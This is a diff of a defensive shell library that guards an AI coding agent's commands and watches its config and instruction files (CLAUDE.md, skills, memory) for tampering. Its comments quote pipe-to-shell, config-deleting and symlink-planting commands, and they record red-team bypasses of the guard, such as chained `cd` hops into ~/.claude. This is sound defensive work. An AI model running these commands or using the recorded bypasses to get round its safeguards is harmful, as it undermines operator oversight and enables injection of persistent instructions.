-    # Only `-c` and its bundled spellings are skipped — `sh -s -- x` reads a
-    # script from stdin, is not expanded, and must keep disqualifying.
-    # `-c` IS SPELLED OUT SEPARATELY because this is a `case` GLOB, not an ERE:
-    # `[a-zA-Z]` matches exactly one character, so `-[a-zA-Z]*c` requires a letter
-    # BEFORE the c and matches `-lc` while missing the bare `-c` — the commonest
-    # spelling of the three. Measured: `-lc` was exempt and `-c` was not, from one
-    # pattern meant to cover both.
-    #
-    # …AND A `-c` SHELL IS ITSELF A PROGRAMMED RUN, which is the second half
-    # (inst-quiet-predicates). It takes its program from the code ARGUMENT, so the
-    # pipe is only that program's stdin: `… | xargs -I{} sh -c 'gh run view {}'`
-    # executes nothing from the pipe as script, yet with no other shell segment
-    # `_ssany` stayed 0 and it blocked. So a `-c` shell now counts as exempt —
-    # unless its code turns stdin back into code: no code, a code argument that
-    # IS a substitution (`sh -c "$(cat)"` expands it in the piped process), an
-    # `eval`/`source`/`.` anywhere in the command, or a stdin path in the code.
-    # Child shells still answer for themselves in this loop — so an UN-expanded
-    # parent (no SEGI child next, as under `env A=1 sudo bash -c`) is not counted.
-    # NOT when xargs splices the pipe INTO the code: `curl … | xargs -I{} sh -c '{}'`
-    # executes piped text, so code holding any xargs replace-string refuses. The
-    # placeholder as an ARGUMENT (`sh -c 'gh run view "$0"' {}`) stays exempt.
+    # A `-c` PARENT IS NOT A SHELL RUN, IT IS THE ENVELOPE OF ONE (edge pass 2026-08-29): seg_expand_interpreters re-tokenizes a `-c` payload into child segments, so the shells that actually run appear on their own and the parent is skipped. Children answer for themselves (`sh -c 'curl ... | sh'` expands to a bare `sh` with NO operand, refused by the `[ -n "$_ssarg" ]` arm below). Only `-c` and its bundled spellings are skipped; `sh -s -- x` must keep disqualifying.
+    # `-c` is spelled out separately because this is a `case` GLOB: `-[a-zA-Z]*c` needs a letter BEFORE the c and misses the bare `-c`.
+    # A `-c` SHELL IS ITSELF A PROGRAMMED RUN (inst-quiet-predicates): its program is the code ARGUMENT and the pipe is only stdin, so it counts as exempt unless its code turns stdin back into code: no code, a code argument that IS a substitution (`sh -c "$(cat)"`), `eval`/`source`/`.` anywhere, or a stdin path in the code. An un-expanded parent (no SEGI child next) is not counted.
+    # NOT when xargs splices the pipe INTO the code (`... | xargs -I{} sh -c '{}'`): code holding any xargs replace-string refuses. The placeholder as an ARGUMENT (`sh -c 'gh run view "$0"' {}`) stays exempt.
     case "$_ssarg" in
       -c|-[a-zA-Z]*c)
         _sscode="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | sed -n 2p)"
@@ -2701,8 +1796,11 @@ XARGS_EOF
         continue ;;
     esac
     [ -n "$_ssarg" ] || return 1
-    case "$_ssarg" in
-      -*|/dev/stdin|/dev/fd/*) return 1 ;;
+    # harbor#1420: options before the script (`sh -x s.sh`, `sh -e s.sh`) do not move the program
+    # to stdin. Walk to the first OPERAND; a code/stdin flag (c, s) or a bare `-` still refuses.
+    _ssop="$(_floor_sh_first_operand "$_ssid")" || return 1
+    case "$_ssop" in
+      ''|-|-*|/dev/stdin|/dev/fd/*) return 1 ;;
     esac
     _ssany=1
   done
@@ -2710,22 +1808,63 @@ XARGS_EOF
   return 0
 }
 
-# floor_seg_interps_all_programmed — exit 0 iff the table is loaded AND every
-# segment running a non-shell interpreter (python, perl, ruby, node, php, lua,
-# osascript) brings its own program: a script operand or a code/module flag
-# (harbor#1313). Sibling of floor_seg_shells_all_named_scripts for the
-# interpreters that, run bare or with `-`, execute what arrives on the pipe.
-#
-# AN ARGV WALK, IN ORDER, because the first decisive word wins: `python - x.py` is
-# a stdin program and `python x.py -` is a script. A stdin path or `-` is the
-# sink; a code flag (-c/-m python, -e/-E perl, -e ruby/lua/osascript, -e/-p node,
-# -r/-f php, glued or bundled) or a non-dash word is a program of its own. Options
-# alone decide nothing, so `perl -w` and `python -u` stay sinks. Residual, stated:
-# an option VALUE reads as a script word (`python -W ignore`), which exempts a
-# pipe that really is a stdin program.
-#
-# EVERY interpreter segment, and fail closed as above: no table, or an oversized
-# payload that yields none, means no exemption and the flat rule blocks.
+# _floor_sh_first_operand <seg-id> — print the first operand of a shell segment, skipping options
+# and the values of the ones that take one (-o X, -O X, --rcfile F, --init-file F). Exit 1 when an
+# option makes stdin the program (-s, -c, bundled too) or no operand exists.
+_floor_sh_first_operand() {
+  _sfskip=0; _sfdd=0
+  for _sfa in $(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${1}://p" | tr ' \t' '\n\n'); do
+    if [ "$_sfskip" = 1 ]; then _sfskip=0; continue; fi
+    if [ "$_sfdd" = 1 ]; then printf '%s\n' "$_sfa"; return 0; fi
+    case "$_sfa" in
+      --) _sfdd=1 ;;
+      --rcfile|--init-file) _sfskip=1 ;;
+      --*) ;;
+      -) printf '%s\n' -; return 0 ;;
+      -*c*|-*s*|+*c*|+*s*) return 1 ;;
+      -*o*|-*O*|+*o*|+*O*) _sfskip=1 ;;
+      -*|+*) ;;
+      *) printf '%s\n' "$_sfa"; return 0 ;;
+    esac
+  done
+  return 1
+}
+
+# floor_seg_all_inert [<own-cmd-ERE>] — exit 0 iff the table is loaded and EVERY segment's command is
+# an inert text consumer (its arguments are data, never a program) or matches <own-cmd-ERE>.
+# harbor#1420: a flat rule's hit is acquitted only on this proof, so a regex alternation in a grep
+# pattern (`'(sed|python3|perl)'`) is not read as a pipe into an interpreter. Fails closed: no table, an
+# unknown command, an executor or a path outside the system bin dirs all answer 1. The inert set is
+# deliberately small; a segment outside it keeps the flat verdict.
+floor_seg_all_inert() {
+  [ -n "${FLOOR_SEGS:-}" ] || return 1
+  printf '%s\n' "$FLOOR_SEGS" | awk -v own="${1:-}" '
+    /^SEGC:/ { c = $0; sub(/^SEGC:[0-9]+:/, "", c); n++
+      if (c !~ /^((\/usr)?(\/local)?\/bin\/|\/opt\/homebrew\/bin\/)?(echo|printf|grep|egrep|fgrep|rg|ag|ack|sort|uniq|wc|head|tail|cut|tr|cat|comm|basename|dirname)$/ \
+          && (own == "" || c !~ own)) bad = 1 }
+    END { exit (n > 0 && !bad) ? 0 : 1 }'
+}
+
+# floor_seg_flat_clear <cmd-ERE> <danger-ERE> — exit 0 iff the table proves a flat hit is text beside the
+# command rather than inside it: some segment runs <cmd-ERE>, none of those segments' own arguments
+# match <danger-ERE> or carry a substitution, and every other segment is an inert text consumer.
+# harbor#1420 §6: the flat regex of python-c-exec read `eval(` in an echo as the python code.
+floor_seg_flat_clear() {
+  [ -n "${FLOOR_SEGS:-}" ] || return 1
+  _fcany=0
+  for _fcid in $(_floor_seg_ids "$1"); do
+    _fcany=1
+    _fcargs="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_fcid}://p" | tr '\n' ' ')"
+    case "$_fcargs" in *@SUB@*|*'`'*) return 1 ;; esac
+    printf ' %s\n' "$_fcargs" | "$FLOOR_GREP" -iEq -- "$2" && return 1
+  done
+  [ "$_fcany" = 1 ] || return 1
+  floor_seg_all_inert "^($1)\$"
+}
+
+# floor_seg_interps_all_programmed - exit 0 iff the table is loaded AND every segment running a non-shell interpreter (python, perl, ruby, node, php, lua, osascript) brings its own program: a script operand or a code/module flag (harbor#1313). Sibling of floor_seg_shells_all_named_scripts for interpreters that, run bare or with `-`, execute what arrives on the pipe.
+# AN ARGV WALK, IN ORDER; the first decisive word wins (`python - x.py` is a stdin program, `python x.py -` a script). A stdin path or `-` is the sink; a code flag (-c/-m python, -e/-E perl, -e ruby/lua/osascript, -e/-p node, -r/-f php, glued or bundled) or a non-dash word is a program. Options alone decide nothing. Residual: an option VALUE reads as a script word (`python -W ignore`).
+# EVERY interpreter segment, fail closed: no table means no exemption.
 floor_seg_interps_all_programmed() {
   [ -n "${FLOOR_SEGS:-}" ] || return 1
   _ipany=0
@@ -2754,44 +1893,13 @@ floor_seg_interps_all_programmed() {
   return 0
 }
 
-# floor_seg_cwd_under <dir> [<dir> …] — exit 0 iff FOLDING this command's
-# cd/pushd chain lands the working directory AT or BELOW one of <dir>.
-#
-# THE STICKY-CD TRIGGER ARMED ON ONE HOP ONLY (pass 13, P13-fs-01, measured at
-# exit 0 against the live floor). It asked "does some `cd` carry the config dir
-# IN ITS OWN ARGUMENT", through a `[^;&|]*` that cannot cross a separator — so
-# the directory had to be spelled by ONE cd, in ONE word:
-#     cd ~ && cd .claude && echo {} > settings.json     rc=0
-#     cd ~; cd .claude; echo {} > settings.json         rc=0
-#     pushd ~ && cd .claude && echo {} > settings.json  rc=0   (`pushd` unlisted)
-# all of which reach the same settings.json as the one spelling that blocked.
-#
-# Appending `pushd` and a second hop answers the three spellings somebody tried,
-# not the question. The question is WHERE THE COMMAND IS STANDING when the
-# mutating segment runs, and the segment table already carries what settles it:
-# an ORDERED list of command words with their operands. So fold them — the
-# arithmetic the shell itself does — and compare PATHS BY COMPONENT instead of
-# matching a spelling. Hops, order, `./` and `../` then cost nothing.
-#
-# Component comparison is also what keeps `cd ~/.claude-notes` OUT. A directory
-# whose name merely begins with the config dir's is not below it, and that is
-# now true by construction rather than by a boundary character class every new
-# rule has to remember to copy — the omission that shipped a false positive in
-# red-team pass 6.
-#
-# UNKNOWN IS NOT "INSIDE". A hook is never told the real working directory, so
-# the fold starts blind and goes blind again at anything it cannot resolve: a
-# `cd -`, a substitution, a glob, a relative hop with no anchor before it. That
-# is the fail-open direction every scanner in this file takes, and the caller
-# keeps its flat trigger alongside for the oversized payload where there is no
-# table to fold at all.
+# floor_seg_cwd_under <dir> [<dir> ...] - exit 0 iff FOLDING this command's cd/pushd chain lands the working directory AT or BELOW one of <dir>.
+# The one-hop sticky-cd trigger was bypassed by `cd ~ && cd .claude && echo {} > settings.json`, the `;` spelling and `pushd ~ && cd .claude && ...` (pass 13, P13-fs-01). The question is WHERE THE COMMAND IS STANDING when the mutating segment runs, so the segment table's ordered command words are folded as the shell does and PATHS ARE COMPARED BY COMPONENT (which also keeps `cd ~/.claude-notes` out; red-team pass 6).
+# UNKNOWN IS NOT "INSIDE": a hook is never told the real cwd, so the fold goes blind at anything it cannot resolve (`cd -`, a substitution, a glob, an unanchored relative hop). That is the fail-open direction of every scanner here; the caller keeps its flat trigger for oversized payloads.
 floor_seg_cwd_under() { # <dir> [<dir> …]
   [ -n "${FLOOR_SEGS:-}" ] || return 1
   [ "$#" -gt 0 ] || return 1
-  # No `cd`/`pushd` anywhere ⇒ nothing to fold. A `case` on a variable is a
-  # builtin and the awk below is a fork: pass 12 measured that a PreToolUse hook
-  # which exceeds its timeout is SKIPPED, so latency here is a fail-open bypass,
-  # not a comfort issue.
+  # No `cd`/`pushd` anywhere means nothing to fold: a `case` is a builtin and the awk is a fork, and latency is a fail-open bypass (pass 12).
   case "$FLOOR_SEGS" in *cd*|*pushd*) ;; *) return 1 ;; esac
   # The directories arrive as INPUT LINES, not as `-v` assignments: awk runs
   # escape processing over a -v value, so a home directory carrying a backslash
@@ -2864,53 +1972,19 @@ floor_seg_cwd_under() { # <dir> [<dir> …]
         if (!got)                                cwd = (w == "cd") ? home : ""
         else if (t == "-" || t ~ /^[-+][0-9]+$/) cwd = ""
         else                                     cwd = resolve(t, cwd)
-        # STICKY: once the command has stood in the config dir, every later
-        # segment is judged as if it still does. Stepping back out with `cd ..`
-        # is not evidence of innocence — the mutating segment may be the one in
-        # between, and that is the shape the one-hop trigger already treated
-        # this way.
+        # STICKY: once the command has stood in the config dir, every later segment is judged as if it still does; stepping out with `cd ..` is not evidence of innocence.
         if (cwd != "" && inside(cwd)) exit 0
       }
       exit 1
     }'
 }
 
-# floor_seg_operand_under <verb-ERE> <dir> [<dir> …] — exit 0 iff, after folding
-# the same cd/pushd chain, some segment whose command matches <verb-ERE> carries
-# an OPERAND that resolves to at-or-below one of <dir>.
-#
-# THE SIBLING QUESTION, AND THE ONE THE CD-BRIDGE ACTUALLY ASKS (edge pass
-# 2026-08-29). floor_seg_cwd_under asks "is the command STANDING in the config
-# dir"; every spelling that matters here asks "is it standing NEXT TO it and
-# reaching in by a relative name". Measured against the installed guard, all of
-#     cd ~ && rm -rf .claude        cd ~; rm -rf .claude
-#     pushd ~ && rm -rf .claude     (cd ~ && rm -rf .claude)
-#     cd ~ && rm -rf .cl*aude       — via any later hop
-# exited 0 while 'rm -rf ~/.claude' blocked: the operand was relative, so no
-# path rule could see a config dir in it, and the cwd was ~ rather than ~/.claude,
-# so the fold said "outside". docs/explanation/admission-baseline.md records this class as P12-argv-01, rated
-# critical and left unpatched; the fold it needed did not exist when it was
-# written, and it does now.
-#
-# THE ANCHOR IS REQUIRED, WHICH IS WHAT KEEPS THIS OFF ORDINARY WORK. `cwd`
-# starts EMPTY, and resolve() returns empty for a relative operand with no
-# anchor before it — so a bare 'rm -rf .claude' typed in some unknown directory
-# is untouched, exactly as it is today. Only a cd/pushd that names a directory
-# lexically arms this, and only for operands under it. `cd ~ && rm -rf .cache`
-# stays allowed because `.cache` is not the config dir, by component comparison
-# rather than by a character class.
-#
-# UNKNOWN IS STILL NOT "INSIDE": a substitution, a glob or a variable in either
-# the cd target or the operand resolves to empty and matches nothing. That is the
-# same fail-open direction as its sibling, and the flat rules stay alongside.
+# floor_seg_operand_under <verb-ERE> <dir> [<dir> ...] - exit 0 iff, after folding the same cd/pushd chain, some segment whose command matches <verb-ERE> carries an OPERAND that resolves to at-or-below one of <dir>.
+# The sibling question, and the one the CD-BRIDGE asks (edge pass 2026-08-29): floor_seg_cwd_under asks whether the command is STANDING in the config dir; here it stands NEXT TO it and reaches in by a relative name (`cd ~ && rm -rf .claude`, `pushd ~ && ...`, `(cd ~ && ...)`, `.cl*aude`), which no path rule could see (admission-baseline.md P12-argv-01).
+# THE ANCHOR IS REQUIRED, which keeps this off ordinary work: `cwd` starts EMPTY and resolve() returns empty for a relative operand with no anchor before it, so a bare rm -rf .claude in an unknown directory is untouched. `cd ~ && rm -rf .cache` stays allowed (component comparison).
+# UNKNOWN IS STILL NOT "INSIDE": a substitution, glob or variable in the cd target or operand resolves to empty and matches nothing (fail-open like its sibling; the flat rules stay alongside).
 floor_seg_operand_under() { # [--dest-only] <verb-ERE> <dir> [<dir> …]
-  # --dest-only JUDGES THE LAST OPERAND AND NOTHING ELSE, which is what makes this
-  # usable for `cp`. docs/explanation/admission-baseline.md records three false positives (P12-argv-fp-01/02/03)
-  # from rules that matched a config-dir operand without asking which SIDE of the
-  # copy it was on: `cp <cfg>/x /tmp/backup` is a READ and must stay allowed, while
-  # `cp /tmp/evil <cfg>/settings.json` is the write that matters. One flag rather
-  # than a sibling function, because a second copy of the cd-chain fold is two
-  # spellings of one rule and that is the drift docs/explanation/modularity.md is about.
+  # --dest-only JUDGES THE LAST OPERAND AND NOTHING ELSE, which makes this usable for `cp`: `cp <cfg>/x /tmp/backup` is a READ and must stay allowed, `cp /tmp/evil <cfg>/settings.json` is the write (P12-argv-fp-01/02/03). One flag, not a sibling function: a second copy of the cd-chain fold is the drift docs/explanation/modularity.md is about.
   [ -n "${FLOOR_SEGS:-}" ] || return 1
   _soum=any
   if [ "${1:-}" = "--dest-only" ]; then _soum=last; shift; fi
@@ -2944,31 +2018,10 @@ floor_seg_operand_under() { # [--dest-only] <verb-ERE> <dir> [<dir> …]
       if (c == "") return ""
       return norm(c "/" t)
     }
-    # A LEADING `=` MEANS EXACT, ANYTHING ELSE MEANS AT-OR-BELOW, and the
-    # difference is the whole false-positive story. The first cut matched the
-    # config dir as a SUBTREE, which made `cd ~/.claude/MEMORY && rm
-    # stale-note.md` a blocked command — deleting one stale note. The suite
-    # caught it as S7, an assertion that has guarded that exact shape since pass
-    # 7. The config dir is deliberately WRITABLE (B8: "they stay writable by
-    # design"); what is protected is the dir ITSELF and its teeth, so the dir is
-    # passed exact and bin/ and hooks/ are passed as subtrees.
-    # A LEADING `%` MEANS "MATCH THIS ERE", which is how a PINNED FILE inside a
-    # writable directory is named without matching the directory (docs/explanation/admission-baseline.md
-    # EDGE-cdbridge-01, reproduced 2026-08-30: `cd ~ && rm .claude/settings.json`
-    # exited 0). This is the fix the record itself prescribes, and the reason the
-    # obvious alternative is wrong: widening the config dir to a subtree closes
-    # this too and costs `cd ~/.claude/MEMORY && rm stale-note.md`, which S7 has
-    # asserted since pass 7. Surface regex, not subtree.
-    #
-    # NO APOSTROPHES BELOW THIS LINE, and none above it either. The whole awk
-    # program is one single-quoted shell word, so one apostrophe in a comment
-    # ends it early and the file stops parsing as shell — harbor#299 is the same
-    # defect in the statusline jq program, and writing this comment reproduced
-    # it. `sh -n` catches it; nothing else does.
-    #
-    # The pattern arrives on an INPUT LINE, so awk does no escape processing on
-    # it and a `\.` in the surface list stays a literal dot — the same reason
-    # VERB and the directories are passed this way rather than through -v.
+    # A LEADING `=` MEANS EXACT, ANYTHING ELSE AT-OR-BELOW: matching the config dir as a SUBTREE blocked `cd ~/.claude/MEMORY && rm stale-note.md` (S7, guarded since pass 7). The config dir is deliberately WRITABLE (B8); what is protected is the dir ITSELF and its teeth, so the dir is passed exact and bin/ and hooks/ as subtrees.
+    # A LEADING `%` MEANS MATCH THIS ERE: it names a PINNED FILE inside a writable directory (EDGE-cdbridge-01: `cd ~ && rm .claude/settings.json` exited 0) without widening to a subtree, which would cost S7.
+    # NO APOSTROPHES IN THIS AWK PROGRAM, comments included: it is one single-quoted shell word, so one apostrophe ends it early (harbor#299). `sh -n` catches it; nothing else does.
+    # The pattern arrives on an INPUT LINE, so awk does no escape processing and a `\.` stays a literal dot.
     function inside(p,   i, d) {
       if (p == "") return 0
       for (i = 1; i <= nd; i++) {
@@ -3207,69 +2260,18 @@ floor_seg_cd_fold() { # <dir>… [+<subtree>…] -> FOLD: lines and SEG rows
     }' 2>/dev/null
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# B8 (harbor#38) — the PERSISTENT INSTRUCTION surfaces.
-# ~/.claude/CLAUDE.md and the agents/skills/commands trees are loaded into every
-# FUTURE session. Writing to them is capability injection with a session's
-# delay, and all four were unwatched: guard-selfedit protects only the floor's
-# own teeth, and B6 hashed settings.json, not these.
-#
-# They stay WRITABLE by design (upstream's "you may edit ~/.claude freely"
-# stance, which the owner kept). What changes is that a change is no longer
-# SILENT: it is pinned here and reported at the next SessionStart — which is
-# exactly when injected instructions would first be loaded.
-# NOT settable from the environment. `FLOOR_INSTR_SURFACES=' '` made the whole
-# check a silent no-op, which is the same undocumented-kill-switch class as
-# FLOOR_AWK/FLOOR_GREP (privsec FO-03/04/05, re-found as B8-04). A project-level
-# settings.json `env` block can set variables, so an overridable watch list is
-# an off switch the operator never agreed to.
-# `hooks` and `plugins` are here as well as under B2/B6: plugins ship hooks and
-# skills, and both are loaded, not merely read.
-#
-# `projects/*/memory` is the auto-memory injected into every session — the
-# highest-value injection target in the tree. It was pulled from this list once,
-# on the assumption that the model rewrites it often enough to make the advisory
-# constant noise; the assumption was MEASURED AND WRONG (red-team B8-NOISE-06,
-# refuted): across 16 session transcripts, 3 (19%) touched the memory dir, and
-# MEMORY.md went untouched through a full day of heavy sessions. A standing
-# advisory until re-pin is the same posture every other surface here has, and
-# each memory write is exactly the model-authored, loaded-into-every-session
-# content this check exists to surface.
-#
-# `inject.d` (harbor#173) IS AN INSTRUCTION SURFACE AND WAS ALMOST SHIPPED
-# UNWATCHED. A rule pack is a markdown file whose body is injected verbatim into
-# a session's context at the moment of a tool call — text loaded into every
-# FUTURE session that nothing else here reports. It is arguably the sharpest
-# surface on the list: a pack arrives at the instant of an action rather than in
-# a prefix a reader may skim, which is measurably why it works (docs/reports/evals.md E6, E10)
-# and exactly why an unreviewed edit to one matters MORE than an unreviewed edit
-# to CLAUDE.md. Caught by checking, on the same branch that built it.
-# `context-rules` is the same surface after harbor#1010; inject.d stays while the engine reads it.
+# B8 (harbor#38) - the PERSISTENT INSTRUCTION surfaces. ~/.claude/CLAUDE.md and the agents/skills/commands trees are loaded into every FUTURE session, so writing to them is capability injection with a session's delay. They stay WRITABLE by design, but a change is pinned here and reported at the next SessionStart, when injected instructions would first load.
+# NOT settable from the environment: an emptied FLOOR_INSTR_SURFACES made the whole check a silent no-op, the kill-switch class of FLOOR_AWK/FLOOR_GREP (privsec FO-03/04/05, B8-04); a project settings.json `env` block could set it.
+# `hooks` and `plugins` are here as well as under B2/B6: plugins ship hooks and skills, both loaded.
+# `projects/*/memory` is the auto-memory injected into every session; it was once pulled for noise and the assumption was measured wrong (red-team B8-NOISE-06: 3 of 16 transcripts touched it).
+# `inject.d` (harbor#173) is an instruction surface: a rule pack's body is injected verbatim at the moment of a tool call (docs/reports/evals.md E6, E10), so an unreviewed edit matters MORE than one to CLAUDE.md. `context-rules` is the same surface after harbor#1010; inject.d stays while the engine reads it.
 FLOOR_INSTR_SURFACES='CLAUDE.md CLAUDE.local.md agents skills commands output-styles hooks plugins context-rules inject.d projects/*/memory'
 
 # floor_sha — one sha256, whichever tool this box has.
 floor_sha() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi | awk '{print $1}'; }
 
-# floor_pluginmeta_sha <json-file> — hash a TIMESTAMP-STRIPPED canonical form of a
-# plugin manifest (harbor#198). The plugin system rewrites `lastUpdated` /
-# `installedAt` in installed_plugins.json and known_marketplaces.json on every
-# session, so hashing raw bytes made B8 report the same paths as drift at EVERY
-# SessionStart and re-pinning could never stick — §2.11 in its literal form. The
-# canonical form keeps the plugin set, every gitCommitSha and every installPath,
-# so an added or repointed plugin is STILL drift; only the clock is ignored.
-# jq missing OR the file not parsing as JSON → hash the RAW bytes, so a manifest
-# we cannot normalize is still WATCHED (fail toward more coverage, never less).
-#
-# `|| true` INSIDE THE SUBSTITUTION, AND IT IS LOAD-BEARING. The pinner runs under
-# `set -eu` (pin-instructions.sh:31), and an assignment whose command substitution
-# exits non-zero aborts the subshell the substitution runs in — so on a manifest jq
-# CANNOT PARSE, the whole function evaporated and `printf '%s  %s'` emitted a line
-# with an EMPTY hash and the path intact. That is worse than the churn it was built
-# to fix and the exact inversion of the sentence above: the file looked watched, its
-# hash was the empty string every time, and any subsequent edit to it was invisible
-# forever. Found 2026-08-18 by the malformed-catalog case in floor-test §9h, which
-# was written for the sibling function below and failed here first. The fallback was
-# always the DESIGN; under `set -e` it was unreachable code.
+# floor_pluginmeta_sha <json-file> - hash a TIMESTAMP-STRIPPED canonical form of a plugin manifest (harbor#198). The plugin system rewrites `lastUpdated`/`installedAt` every session, so raw bytes made B8 report drift at EVERY SessionStart. The plugin set, gitCommitSha and installPath stay hashed; only the clock is ignored. jq missing or unparsable: hash the RAW bytes (fail toward more coverage).
+# `|| true` INSIDE THE SUBSTITUTION IS LOAD-BEARING: the pinner runs under `set -eu` (pin-instructions.sh), and without it a manifest jq cannot parse aborted the function and emitted an EMPTY hash with the path intact, so the file looked watched while any edit was invisible (floor-test 9h).
 floor_pluginmeta_sha() { # <json-file>
   if command -v jq >/dev/null 2>&1; then
     _pmn="$(jq -S 'walk(if type=="object" then del(.lastUpdated, .installedAt) else . end)' "$1" 2>/dev/null || true)"
@@ -3289,43 +2291,9 @@ floor_syncmeta_sha() { # <json-file>
   floor_sha < "$1"
 }
 
-# floor_marketplace_sha <json-file> — hash a marketplace CATALOG with the per-entry
-# `source.sha` stripped. Same failure as harbor#198, different file and a field that
-# is not a clock, so it needs its own justification rather than an extra `del()` in
-# the function above.
-#
-# MEASURED 2026-08-18 against anthropics/claude-plugins-official, the marketplace
-# this box actually tracks: 17 commits touched `.claude-plugin/marketplace.json` on
-# 2026-08-18 alone, 13 on 2026-08-17, and a 100-commit page for that single path did
-# not reach its end. EVERY ONE is `bump(<plugin>): <oldsha> → <newsha>`, and the diff
-# is ONE line — `.plugins[].source.sha`. So the raw bytes of this file change several
-# times a day, B8 goes red several times a day, and the operator is invited to bless
-# a 286-entry vendor catalog they cannot diff (the marketplace is not a git checkout
-# locally, so there is no previous copy to compare against). That is §2.11 arriving
-# on a schedule Anthropic controls: measured on this box 2026-08-18, the pin went red
-# 66 seconds after a clean `pin-instructions --apply`.
-#
-# WHY THIS IS NOT A WEAKENED GATE — the argument has to be that the stripped field
-# cannot carry an instruction into a session, not merely that it is noisy:
-#   · `url`, `path` and `ref` STAY hashed. Repointing an entry at an attacker's repo
-#     is the actual supply-chain attack, and it still reads as drift (validated: a
-#     one-entry url change moves this hash; a sha bump does not).
-#   · Everything INSTALLED keeps its own pinned sha. installed_plugins.json carries
-#     `gitCommitSha` per installed plugin and floor_pluginmeta_sha deliberately
-#     preserves it — 4 entries on this box, verified 2026-08-18.
-#   · A catalog sha is a FORECAST, not a load. When that sha is actually fetched the
-#     plugin's own files land under `plugins/` and are hashed file-by-file, so the
-#     content change is caught at the moment it can reach a session — which is later
-#     than the catalog edit and strictly more informative than it.
-# 233 of 286 entries carry an object `source`; the other 53 are plain strings and are
-# untouched by the projection. Every marketplace.json is RE-EMITTED below rather than
-# dropped, so the file stays in the manifest and an entry added, removed or repointed
-# is still drift — only the upstream sha treadmill is ignored.
-# jq missing OR the file not parsing as JSON → hash the RAW bytes, so a catalog we
-# cannot normalize is still WATCHED (fail toward more coverage, never less). The
-# `|| true` is what makes that reachable under the pinner's `set -eu` — see the note
-# on floor_pluginmeta_sha above, where the same one-token omission had been silently
-# emitting an empty hash for any manifest jq could not parse.
+# floor_marketplace_sha <json-file> - hash a marketplace CATALOG with the per-entry `source.sha` stripped. Same failure as harbor#198 with a field that is not a clock: upstream bumps `.plugins[].source.sha` many times a day, so the pin went red several times a day over a vendor catalog the operator cannot diff.
+# Not a weakened gate: `url`, `path` and `ref` STAY hashed (repointing an entry is the supply-chain attack and still reads as drift); everything INSTALLED keeps its own pinned gitCommitSha (floor_pluginmeta_sha); and a catalog sha is a FORECAST, not a load, since the fetched plugin's files land under `plugins/` and are hashed file by file. The file is RE-EMITTED, so an entry added, removed or repointed is still drift.
+# jq missing or unparsable: hash the RAW bytes; the `|| true` makes that reachable under the pinner's `set -eu` (see floor_pluginmeta_sha).
 floor_marketplace_sha() { # <json-file>
   if command -v jq >/dev/null 2>&1; then
     _mkn="$(jq -S '(.plugins | arrays) |= map((.source | objects) |= del(.sha))' "$1" 2>/dev/null || true)"
@@ -3357,18 +2325,10 @@ floor_installed_sha() {
                      else . end)' "$1" 2>/dev/null || true)"
   if [ -n "$_isn" ]; then printf '%s' "$_isn" | floor_sha; else floor_pluginmeta_sha "$1"; fi
 }
-# ── what a marketplace holds that nothing can load (harbor#1390) ────────────
-# A marketplace checkout carries every plugin it lists, and the harness loads only the ones a settings file enables
-# or installed_plugins.json installs, from their installPath (walked above by content). An upstream edit to a plugin
-# nobody enabled turned B8 amber at every SessionStart, and so did the plugin directory's own catalog cache, whose
-# listings are plugins that are not installed. Neither can carry an instruction into a session, so:
+# What a marketplace holds that nothing can load (harbor#1390): a checkout carries every plugin it lists, but the harness loads only those a settings file enables or installed_plugins.json installs. Upstream edits to a plugin nobody enabled, and the directory's own catalog cache, turned B8 amber at every SessionStart and cannot carry an instruction, so:
 #   D <prefix>      plugins/marketplaces/<mp>/<plugins|external_plugins>/<dir>/ of a plugin no name below can load
 #   R <path> <sha>  plugins/plugin-directory-cache-v2.json hashed over the listings of loadable plugins only, clock-free
-# The names: every installed_plugins.json key (any scope) and every enabledPlugins key not set to false, in this
-# config dir's settings.json and settings.local.json, compared without the @<marketplace>. A dir is kept when its
-# name is one of them or a kept catalog entry's string source points in or under it. FAIL TOWARD COVERAGE: no jq,
-# an installed_plugins.json the loaded walk cannot read exactly, a settings file or a catalog that does not parse,
-# or a name with a tab, newline or backslash, and nothing is dropped.
+# The names: every installed_plugins.json key and every enabledPlugins key not set to false in this config dir's settings.json and settings.local.json, compared without the @<marketplace>. A dir is kept when its name is one of them or a kept catalog entry's string source points in or under it. FAIL TOWARD COVERAGE: no jq, an unreadable installed_plugins.json, an unparsable settings file or catalog, or a name with a tab, newline or backslash, and nothing is dropped.
 floor_plugins_unloaded() { # <config-dir>
   _pu="$1/plugins"
   command -v jq >/dev/null 2>&1 || return 0
@@ -3464,21 +2424,8 @@ floor_instr_diff() {
     { n[$0] = 1 } END { for (k in p) if (!(k in n)) print "< " k; for (k in n) if (!(k in p)) print "> " k }' | sort
 }
 
-# floor_instr_manifest <config-dir> — "<sha>  <relative-path>" per file, sorted.
-# ONE implementation, shared by the pinner and the gate: two hashers that agree
-# only by coincidence would report drift on every session or on none.
-#
-# `-exec … +` batches the hashing. Hashing 597 skill files one spawn at a time
-# measured 9.4s; batched it is 0.14s (2026-07-25). A SessionStart hook that
-# takes nine seconds is a hook the operator disables, so the batching is a
-# correctness property, not a micro-optimisation.
-# SYMLINKS ARE THE WHOLE GAME HERE. A plain `find -type f` walk does not match a
-# symlink at all, so `ln -s /tmp/evil.md skills/evil.md` was invisible, and a
-# top-level `CLAUDE.md` symlinked into a dotfiles repo — an extremely common
-# setup — recorded as "absent", blinding the check permanently (red-team B8-02,
-# B8-03). Two things are therefore recorded for every tree: the CONTENT reached
-# by following links (`find -L`), and the LINK TARGETS themselves, so that
-# re-pointing a link is drift even when the new target is byte-identical.
+# floor_instr_manifest <config-dir> - "<sha>  <relative-path>" per file, sorted. ONE implementation shared by the pinner and the gate: two hashers that agree by coincidence would report drift on every session or on none. `-exec ... +` batches the hashing (597 skill files: 9.4s one spawn at a time, 0.14s batched); a nine-second SessionStart hook is one the operator disables.
+# SYMLINKS ARE THE WHOLE GAME HERE: a plain `find -type f` does not match a symlink, so a planted link was invisible and a symlinked top-level CLAUDE.md recorded as "absent" (red-team B8-02, B8-03). Two things are recorded for every tree: the CONTENT reached by following links, and the LINK TARGETS themselves, so re-pointing a link is drift even when the new target is byte-identical.
 # True when a projects/<x>/memory link only points at another projects/<y>/memory of the same config dir that
